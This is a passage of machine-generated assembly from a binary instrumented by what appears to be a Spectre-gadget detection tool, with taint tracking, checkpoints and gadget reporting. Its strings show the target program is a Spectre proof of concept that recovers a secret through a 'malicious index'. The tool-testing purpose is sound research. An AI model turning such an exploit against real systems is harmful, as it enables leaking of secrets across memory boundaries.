            jmp restore_checkpoint_EXT_LIB@PLT

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%r15,%rbx,8),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___897

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___897:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            callq *(%r15,%rbx,8)

            addq $1,%rbx
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+7),%al
            orb (dift_reg_tags+1),%al
            testb $48,%al
            je .L__check_ok__teapot___898

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___898:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            cmpq %rbx,%rbp
            movq %rax,(scratchpad)
            leaq (.__trampoline__c8d8c201_2d94_4743_acb2_9d3b329d314c__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___900)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__c8d8c201_2d94_4743_acb2_9d3b329d314c__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___900:

            nop
            jne .L_1ba0__teapot__
.L__trampoline_target__d096c8da_1bab_4290_94e4_3531ce087f42__teapot__:
.L_1bb6__teapot__:

            addq $8,%rsp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___901

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___901:

            nop
            popq %rbx
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___902

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___902:

            nop
            popq %rbp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r15d,%r15d
            orb (%r12),%r15b
            movb %r15b,(dift_reg_tags+12)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___903

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%r13
            orb %r15b,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___903:

            nop
            popq %r12
            leaq (%rsp),%r13
            btcq $45,%r13
            xorl %r14d,%r14d
            orb (%r13),%r14b
            movb %r14b,(dift_reg_tags+13)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___904

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___904:

            nop
            popq %r13
            movq %rax,(scratchpad+524288)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r14d,%r14d
            orb (%rax),%r14b
            movb %r14b,(dift_reg_tags+14)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___905

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___905:

            nop
            movq (scratchpad+524288),%rax
            popq %r14
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r15d,%r15d
            orb (%rax),%r15b
            movb %r15b,(dift_reg_tags+15)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___906

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%rbx
            orb %r15b,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___906:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %r15
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $8,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___909

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___909:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 

            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
.size __libc_csu_init__teapot__, . - __libc_csu_init__teapot__
.L__indbr_transform_target___libc_csu_fini__738e53dc_024d_4dc5_a63f_51c546cafebf__teapot__:
__libc_csu_fini__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $86,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $2,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___915

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___915:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size __libc_csu_fini__teapot__, . - __libc_csu_fini__teapot__
.__transient_end__teapot__:

#===================================
# end section .teapot_transient
#===================================

#===================================
.section .teapot_trampolines, "ax"
#===================================

.align 2
.__trampoline__9d890186_5d58_4dc5_b875_330870304b82__teapot__:
.__trampoline__08a9741c_8b6a_4627_a2fd_ba42f066f656__teapot__:

            je .L__trampoline_target__6c1a7b2a_ea4f_4e65_be97_0007a1b2e15c__teapot__

            jmp .L_12b8__teapot__
.__trampoline__3637f681_0bfd_4eb1_9855_07b1a9aa101f__teapot__:
.__trampoline__0123dae6_c74c_479f_8df9_d4585205bbe3__teapot__:

            jne .L__trampoline_target__ef617115_83d6_4203_b3b5_1d386043a2a7__teapot__

            jmp .L_1b33__teapot__
.__trampoline__e7bf71ac_233e_4d96_a5d9_49bd4408bafb__teapot__:
.__trampoline__6c1a7b2a_ea4f_4e65_be97_0007a1b2e15c__teapot__:

            je .L__trampoline_target__fa7464de_d735_4681_a4c1_a729a17fce2a__teapot__

            jmp .L_12b8__teapot__
.__trampoline__001696f8_80c8_4f62_9bee_301421d5978b__teapot__:
.__trampoline__fa28af4d_7400_489c_a6f6_2260c9c35214__teapot__:

            je .L__trampoline_target__c2dcdedb_dcda_439c_b4c2_d7d3aa7f0cb9__teapot__

            jmp .L_1401__teapot__
.__trampoline__f6f5e5e5_e408_433c_abc2_049517e56f22__teapot__:
.__trampoline__b9212420_fcfa_44cb_9e14_56097bdc3d1e__teapot__:

            jne .L__trampoline_target__66486815_7f0e_4589_bda2_01ad7a9bed52__teapot__

            jmp .L_12f8__teapot__
.__trampoline__be456ae1_c16a_45bc_a4a9_14a207f75d95__teapot__:
.__trampoline__66486815_7f0e_4589_bda2_01ad7a9bed52__teapot__:

            je .L__trampoline_target__b617a250_9436_4534_8766_fd857a66a7a1__teapot__

            jmp .L_12e7__teapot__
.__trampoline__a8f5131e_ffeb_4256_8f88_ea03495e84ce__teapot__:
.__trampoline__2e1eb74e_d668_4c69_8752_a770c9707337__teapot__:

            je .L__trampoline_target__7bf83f7d_95bc_42bc_b352_29737188d410__teapot__

            jmp .L_14c8__teapot__
.__trampoline__9998af03_97a2_43e5_93e5_3517e89be9d2__teapot__:
.__trampoline__96be25db_daab_49d1_9a80_379c0c0c1674__teapot__:

            je .L__trampoline_target__e6061643_58c4_49ce_9ae8_81498d19cbad__teapot__

            jmp .L_1bb6__teapot__
.__trampoline__345bb64b_5d5d_4273_b3ab_6de102c2ffed__teapot__:
.__trampoline__969e3e57_33e8_48a3_8dab_5c922b275781__teapot__:

            jne .L__trampoline_target__a998571d_2e05_43e3_8417_265288cd7085__teapot__

            jmp .L_14b9__teapot__
.__trampoline__c8d8c201_2d94_4743_acb2_9d3b329d314c__teapot__:
.__trampoline__520c4071_24d9_492e_b6cb_c8b84a573cbf__teapot__:

            jne .L__trampoline_target__d096c8da_1bab_4290_94e4_3531ce087f42__teapot__

            jmp .L_1ba0__teapot__
.__trampoline__eb026ad7_5c62_47cd_bd9e_40636ce4cc33__teapot__:
.__trampoline__acbc9192_05a6_4210_b951_911c97f79d8a__teapot__:

            jbe .L__trampoline_target__04354667_8e45_4662_aa56_d51939b5c969__teapot__

            jmp .L_1522__teapot__
.__trampoline__3397588c_3241_4448_966e_9b44c092b5e5__teapot__:
.__trampoline__29240a47_21b8_4aff_ab54_968a7ab4cd25__teapot__:

            jbe .L__trampoline_target__138b325c_5fe9_4a1a_b86e_20f81eb2c3da__teapot__

            jmp .L_1538__teapot__
.__trampoline__d9a78565_f49e_4370_ab42_4fcc3f4c2076__teapot__:
.__trampoline__138b325c_5fe9_4a1a_b86e_20f81eb2c3da__teapot__:

            ja .L__trampoline_target__ae20bfba_6a9b_4b3c_9285_d5eeec099e7e__teapot__

            jmp .L_1538__teapot__
.__trampoline__0d648235_990a_4d62_8936_daa8a905a9db__teapot__:
.__trampoline__f87dc753_2ee9_4bd6_9821_e676ccd8147d__teapot__:

            jne .L__trampoline_target__8102deb9_fe07_4f28_9772_f41855e0b4e1__teapot__

            jmp .L_1350__teapot__
.__trampoline__ae20bfba_6a9b_4b3c_9285_d5eeec099e7e__teapot__:
.__trampoline__d4b3ab72_cc21_4c54_a149_64390f6b9b56__teapot__:

            jbe .L__trampoline_target__408d6aab_a42b_4c3b_b93f_7b82a0db8f58__teapot__

            jmp .L_14fb__teapot__
.__trampoline__8de62071_7928_4381_a7eb_0b62b6f1f7b7__teapot__:
.__trampoline__8102deb9_fe07_4f28_9772_f41855e0b4e1__teapot__:

            jne .L__trampoline_target__fa5a5ad2_a4a8_48a5_a4d4_fc4b3fb8d23e__teapot__

            jmp .L_1366__teapot__
.__trampoline__871aa948_cddd_4f5b_8eb7_1facbb9d78c1__teapot__:
.__trampoline__9f7cd845_a005_4068_9b29_f581d8b4e79e__teapot__:

            je .L__trampoline_target__0f1a0ba5_030a_4d24_82a6_5dc94d3afaf7__teapot__

            jmp .L_1278__teapot__
.__trampoline__9ed98da6_eadc_4929_9866_9d34a66fdecf__teapot__:
.__trampoline__0f1a0ba5_030a_4d24_82a6_5dc94d3afaf7__teapot__:

            je .L__trampoline_target__3af905d6_372f_42e0_925a_313b2f99eda8__teapot__

            jmp .L_1278__teapot__
.__trampoline__47750739_4dbe_4b09_814d_88018b305708__teapot__:
.__trampoline__2349f3b9_d480_4280_a9a2_353d9ea4c4c9__teapot__:

            je .L__trampoline_target__9ff78411_1d6f_4341_bf42_3857855f3c85__teapot__

            jmp .L_13a6__teapot__
.__trampoline__66ed920a_c1ea_40bd_9954_18d11801e056__teapot__:
.__trampoline__b6db33d9_25b0_444c_b7e4_fcaaf5fd8af1__teapot__:

            je .L__trampoline_target__3b32d92d_788c_43bb_91b0_38668d75dda3__teapot__

            jmp .L_16b7__teapot__
.__trampoline__f44d9fb5_9124_4190_ae6b_78059fb6eaa8__teapot__:
.__trampoline__d49eeba5_904a_4187_b78a_e46d8c7310ac__teapot__:

            jne .L__trampoline_target__3355bc12_2f56_40e8_86e7_a47839b48bb9__teapot__

            jmp .L_15ce__teapot__
.__trampoline__ee029a32_d540_450c_8c2f_ddab3cb38004__teapot__:
.__trampoline__732d7cd7_aa82_4282_ae2d_2df653e22ee0__teapot__:

            jbe .L__trampoline_target__479025d9_6ebc_4cf3_a8d3_04093a6b7dc9__teapot__

            jmp .L_1acf__teapot__
.__trampoline__70a0842c_7442_4079_80d5_8a6e361514d1__teapot__:
.__trampoline__3f2be5c9_be44_4b3b_9ed0_cf84ebf303b7__teapot__:

            jne .L__trampoline_target__feba9be2_389a_47d5_a1fb_b0570cc80cc9__teapot__

            jmp .L_1622__teapot__
.__trampoline__a84f83ad_1e7c_4966_8724_0854a0275058__teapot__:
.__trampoline__479025d9_6ebc_4cf3_a8d3_04093a6b7dc9__teapot__:

            jne .L__trampoline_target__bc628f63_d6f9_40e8_b280_350f4b94be03__teapot__

            jmp .L_1acf__teapot__
.__trampoline__56a60200_76a9_4348_afec_f9d08a4fb692__teapot__:
.__trampoline__3cd42740_ca65_4fa1_ac56_645963515d05__teapot__:

            ja .L__trampoline_target__0c647829_3f6e_424c_8bc4_eec8c4caa290__teapot__

            jmp .L_170f__teapot__
.__trampoline__0c647829_3f6e_424c_8bc4_eec8c4caa290__teapot__:
.__trampoline__73454647_e019_4b26_ac47_096045cba6c2__teapot__:

            jae .L__trampoline_target__d17a78f8_0b4a_470d_ba38_5bd43afed7ce__teapot__

            jmp .L_1734__teapot__
.__trampoline__2d8b2904_dc58_4a0a_bf26_858b40035890__teapot__:
.__trampoline__a0b2349d_d497_44ab_adc1_f79988d7df99__teapot__:

            je .L__trampoline_target__3a392698_d00d_43c5_a4bb_0b58dafc3b41__teapot__

            jmp .L_1991__teapot__
.__trampoline__19a633a3_58ec_450c_a1a7_e5cecca00a47__teapot__:
.__trampoline__3a392698_d00d_43c5_a4bb_0b58dafc3b41__teapot__:

            jne .L__trampoline_target__3ee3f720_b829_4976_b024_2b3d32a69ba9__teapot__

            jmp .L_1936__teapot__
.__trampoline__31500b1f_dd7d_45c8_8bf8_60e62467f1b2__teapot__:
.__trampoline__ef3bf9f5_b46a_4d7a_9b10_8b9b47f68315__teapot__:

            je .L__trampoline_target__7f91e847_4eef_40c6_b80c_0925e8a4b959__teapot__

            jmp .L_1a9b__teapot__
.__trampoline__b88d08a0_3a05_4252_8951_2ed6bfab4973__teapot__:
.__trampoline__4657c448_5658_48f1_aed9_4ee4ad5a94b3__teapot__:

            je .L__trampoline_target__9fd54977_5f65_4ad2_b922_898b3ccaeb6f__teapot__

            jmp .L_191e__teapot__
.__trampoline__643980ef_5071_4300_a67b_3238470ceaf1__teapot__:
.__trampoline__f3d0f919_f7e0_480f_9dfd_b16b351dfcd9__teapot__:

            je .L__trampoline_target__945a069b_47d2_45be_9a5e_55a7294f34ef__teapot__

            jmp .L_1472__teapot__
.__trampoline__b8e70c93_4c51_48a8_b0b2_7b514a43b309__teapot__:
.__trampoline__c362d663_c2e2_43fc_a017_845a8fca99b0__teapot__:

            je .L__trampoline_target__3453da8d_f0d7_4ce6_8fb5_5a0d3afaea11__teapot__

            jmp .L_192f__teapot__
.__trampoline__a443664a_f1ad_4fd9_a559_5be26ad24f64__teapot__:
.__trampoline__0fb98d1e_c46e_40b6_a492_bc4dd330d8a3__teapot__:

            jne .L__trampoline_target__f5d48e9c_155d_40e4_b21e_ff02e865f439__teapot__

            jmp .L_19fe__teapot__
#===================================
# end section .teapot_trampolines
#===================================

#===================================
.section .interp ,"a",@progbits
#===================================

.align 1
          .string "/lib64/ld-linux-x86-64.so.2"
#===================================
# end section .interp
#===================================

#===================================
.section .init_array ,"wa"
#===================================

.align 8
__init_array_start:
#-----------------------------------
.type __frame_dummy_init_array_entry, @object
#-----------------------------------
__frame_dummy_init_array_entry:
          .quad frame_dummy
__init_array_end:
#===================================
# end section .init_array
#===================================

#===================================
.section .fini ,"ax",@progbits
#===================================

.align 8
#-----------------------------------
.globl _fini
.hidden _fini
.type _fini, @function
#-----------------------------------
_fini:

            endbr64 
            subq $8,%rsp
            addq $8,%rsp
            retq 
.size _fini, . - _fini
#===================================
# end section .fini
#===================================

#===================================
.section .note.ABI-tag ,"a"
#===================================

.align 4
          .byte 0x4
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x10
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x1
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x47
          .byte 0x4e
          .byte 0x55
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x3
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x2
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
#===================================
# end section .note.ABI-tag
#===================================

#===================================
.section .rodata ,"a",@progbits
#===================================

.align 16
#-----------------------------------
.globl _IO_stdin_used
.type _IO_stdin_used, @object
.size _IO_stdin_used, 4
#-----------------------------------
_IO_stdin_used:
.L_2000:
          .byte 0x1
          .byte 0x0
          .byte 0x2
          .byte 0x0
.L_2004:
          .string "setrlimit failed"
.L_2015:
          .string "Initial malloc failed"
.L_202b:
          .string "Secret addr: %p\n"
.L_203c:
          .ascii "Other "
.L_2042:
          .string "Array addr: %p\n"
.L_2052:
          .string "spectre.c"
.L_205c:
          .string "data"
.L_2061:
          .string "Offset: %#lx\n"
.L_206f:
          .string "mmap"
.L_2074:
          .string "Recovered secret: \"%s\"\n"
          .zero 4
.L_2090:
          .string "Best guess: '%c' (ASCII=%#4x, #hits=%3lu); 2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n"
          .zero 6
.L_20f0:
          .string "Avg. hit latency: %lu, Avg. miss latency: %lu, Threshold: %lu\n"
          .zero 1
.L_2130:
          .string "-----------------------------------------"
          .zero 6
.L_2160:
          .string "Secret address: %p, Array address: %p\n"
          .zero 1
.L_2188:
          .string "The malicious index is %p-%p=%#lx\n"
          .zero 5
#-----------------------------------
.type __PRETTY_FUNCTION__.33725, @object
.size __PRETTY_FUNCTION__.33725, 18
#-----------------------------------
__PRETTY_FUNCTION__.33725:
          .string "calibrate_latency"
#===================================
# end section .rodata
#===================================

#===================================
.section .note.gnu.property ,"a"
#===================================

.align 8
          .byte 0x4
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x10
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x5
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x47
          .byte 0x4e
          .byte 0x55
          .byte 0x0
          .byte 0x2
          .byte 0x0
          .byte 0x0
          .byte 0xc0
          .byte 0x4
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x3
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
#===================================
# end section .note.gnu.property
#===================================

#===================================
.section .teapot_guards, "aw"
#===================================

.align 8
.globl __guard_start__teapot__
__guard_start__teapot__:
          .zero 452
.globl __guard_end__teapot__
__guard_end__teapot__:
#===================================
# end section .teapot_guards
#===================================

#===================================
.section .init ,"ax",@progbits
#===================================

.align 16
#-----------------------------------
.globl _init
.hidden _init
.type _init, @function
#-----------------------------------
_init:

            endbr64 
            subq $8,%rsp
            movq (__gmon_start__@GOTPCREL)(%rip),%rax
            testq %rax,%rax
            je .L_1016

            callq *%rax
.L_1016:

            addq $8,%rsp
            retq 
.size _init, . - _init
#===================================
# end section .init
#===================================

#===================================
.section .fini_array ,"wa"
#===================================

.align 8
#-----------------------------------
.type __do_global_dtors_aux_fini_array_entry, @object
#-----------------------------------
__do_global_dtors_aux_fini_array_entry:
          .quad __do_global_dtors_aux
#-----------------------------------
.type _DYNAMIC, @object
#-----------------------------------
_DYNAMIC:
#===================================
# end section .fini_array
#===================================

#===================================
.text
#===================================

.align 16
#-----------------------------------
.globl _start
.type _start, @function
#-----------------------------------
_start:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            endbr64 
.cfi_undefined 16
            xorl %ebp,%ebp
            movq %rdx,%r9
            popq %rsi
            movq %rsp,%rdx
            andq $-16,%rsp
            pushq %rax
            pushq %rsp
            leaq (__libc_csu_fini)(%rip),%r8
            leaq (__libc_csu_init)(%rip),%rcx
            leaq (main)(%rip),%rdi
            callq *(__libc_start_main@GOTPCREL)(%rip)

            hlt 
.cfi_endproc 

            nop
.size _start, . - _start
.align 16
#-----------------------------------
.type deregister_tm_clones, @function
#-----------------------------------
deregister_tm_clones:

            leaq (_end)(%rip),%rdi
            leaq (_end)(%rip),%rax
            cmpq %rdi,%rax
            je .L_1278

            movq (_ITM_deregisterTMCloneTable@GOTPCREL)(%rip),%rax
            testq %rax,%rax
            je .L_1278

            jmpq *%rax
          .byte 0xf
          .byte 0x1f
          .byte 0x80
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
.L_1278:

            retq 
.size deregister_tm_clones, . - deregister_tm_clones
          .byte 0xf
          .byte 0x1f
          .byte 0x80
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
.align 16
#-----------------------------------
.type register_tm_clones, @function
#-----------------------------------
register_tm_clones:

            leaq (_end)(%rip),%rdi
            leaq (_end)(%rip),%rsi
            subq %rdi,%rsi
            movq %rsi,%rax
            shrq $63,%rsi
            sarq $3,%rax
            addq %rax,%rsi
            sarq $1,%rsi
            je .L_12b8

            movq (_ITM_registerTMCloneTable@GOTPCREL)(%rip),%rax
            testq %rax,%rax
            je .L_12b8

            jmpq *%rax
          .byte 0x66
          .byte 0xf
          .byte 0x1f
          .byte 0x44
          .byte 0x0
          .byte 0x0
.L_12b8:

            retq 
.size register_tm_clones, . - register_tm_clones
          .byte 0xf
          .byte 0x1f
          .byte 0x80
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
.align 16
#-----------------------------------
.type __do_global_dtors_aux, @function
#-----------------------------------
__do_global_dtors_aux:

            endbr64 
            cmpb $0,(completed.8061)(%rip)
            jne .L_12f8

            pushq %rbp
            cmpq $0,(__cxa_finalize@GOTPCREL)(%rip)
            movq %rsp,%rbp
            je .L_12e7

            movq (.L_4008)(%rip),%rdi
            callq __cxa_finalize@PLT
.L_12e7:

            callq deregister_tm_clones

            movb $1,(completed.8061)(%rip)
            popq %rbp
            retq 
          .byte 0xf
          .byte 0x1f
          .byte 0x0
.L_12f8:

            retq 
.size __do_global_dtors_aux, . - __do_global_dtors_aux
          .byte 0xf
          .byte 0x1f
          .byte 0x80
          .byte 0x0
          .byte 0x0
          .byte 0x0
          .byte 0x0
.align 16
#-----------------------------------
.type frame_dummy, @function
#-----------------------------------
frame_dummy:

            endbr64 
            jmp register_tm_clones
.size frame_dummy, . - frame_dummy
#-----------------------------------
.globl set_heap_limit
.type set_heap_limit, @function
#-----------------------------------
set_heap_limit:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            endbr64 
            subq $40,%rsp
.cfi_def_cfa_offset 48
            leaq %fs:40,%rax
            movq %rax,(scratchpad)
            movq %fs:40,%rax
            leaq 24(%rsp),%rsi
            movq %rsi,(scratchpad+8)
            movq %rax,24(%rsp)
            xorl %eax,%eax
            leaq (%rsp),%rsi
            movq %rsi,(scratchpad+16)
            movq %rdi,(%rsp)
            leaq 8(%rsp),%rsi
            movq %rsi,(scratchpad+24)
            movq %rdi,8(%rsp)
            movq %rsp,%rsi
            movl $9,%edi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rsi,(scratchpad+524320)
            movq %rdi,(scratchpad+524328)
            movabsq $scratchpad,%rdx
            movabsq $35184372088832,%rsi
            movq (%rdx),%rax
            xorq %rsi,%rax
            movabsq $dift_reg_tags,%rdi
            movb 6(%rdi),%bl
            orb (%rax),%bl
            movq 8(%rdx),%rax
            xorq %rsi,%rax
            movzbl %bl,%ebx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rbx
            movq %rbx,(%rax)
            movb $0,(%rdi)
            movb 5(%rdi),%bl
            orb 6(%rdi),%bl
            movq 16(%rdx),%rax
            xorq %rsi,%rax
            movzbl %bl,%ebx
            imulq %rcx,%rbx
            movq %rbx,(%rax)
            movb 5(%rdi),%bl
            orb 6(%rdi),%bl
            xorq 24(%rdx),%rsi
            movzbl %bl,%ebx
            imulq %rcx,%rbx
            movq %rbx,(%rsi)
            movb 6(%rdi),%sil
            movb %sil,4(%rdi)
            movb $0,5(%rdi)
            movq (scratchpad+524328),%rdi
            movq (scratchpad+524320),%rsi
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            callq setrlimit__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_set_heap_limit__0d648235_990a_4d62_8936_daa8a905a9db__teapot__

            testl %eax,%eax
            leaq (.__trampoline__0d648235_990a_4d62_8936_daa8a905a9db__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___923)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__0d648235_990a_4d62_8936_daa8a905a9db__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___923:

            nop
            jne .L_1350

            leaq 24(%rsp),%rax
            movq %rax,(scratchpad)
            movq 24(%rsp),%rax
            movq %rax,(scratchpad+524288)
            leaq %fs:40,%rax
            movq %rax,(scratchpad+8)
            movq (scratchpad+524288),%rax
            xorq %fs:40,%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
